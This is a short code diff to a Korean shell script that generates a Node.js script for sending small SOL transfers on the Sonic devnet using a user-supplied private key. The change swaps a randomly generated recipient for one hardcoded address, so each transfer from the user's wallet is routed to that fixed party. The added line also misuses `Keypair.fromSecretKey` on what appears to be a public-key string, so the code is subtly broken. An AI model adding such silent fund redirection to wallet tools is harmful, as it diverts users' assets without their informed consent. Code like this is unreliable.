@@ -68,7 +68,9 @@ const connection = new Connection("https://devnet.sonic.game", 'confirmed');
 // 개인 키 입력
 const privkey = "$privkey"; // 개인 키를 여기에 입력하세요
 const from = Keypair.fromSecretKey(bs58.decode(privkey));
-const to = Keypair.generate(); // 수신자 주소를 생성합니다
+
+// 수신자 주소를 하드코딩된 주소로 설정
+const toPubkey = new Keypair.fromSecretKey(bs58.decode("7cb7ATwM9hsEav7yKsbZU8vVqU37VJSFnmyDJXKQEwkV")).publicKey;
 
 async function sendTransaction(wallet) {
     const tx = new Transaction();
@@ -90,7 +92,7 @@ async function sendTransaction(wallet) {
     tx.add(
         SystemProgram.transfer({
             fromPubkey: from.publicKey,
-            toPubkey: to.publicKey,
+            toPubkey: toPubkey,
             lamports: LAMPORTS_PER_SOL * 0.001 // 전송할 SOL 수 (0.001 SOL)
         })
     );
@@ -116,4 +118,3 @@ node kjk.mjs
 echo
 echo -e "${YELLOW}모든 작업이 완료되었습니다. 컨트롤+A+D로 스크린을 종료해주세요.${NC}"
 echo -e "${GREEN}스크립트 작성자: https://t.me/kjkresearch${NC}"
-
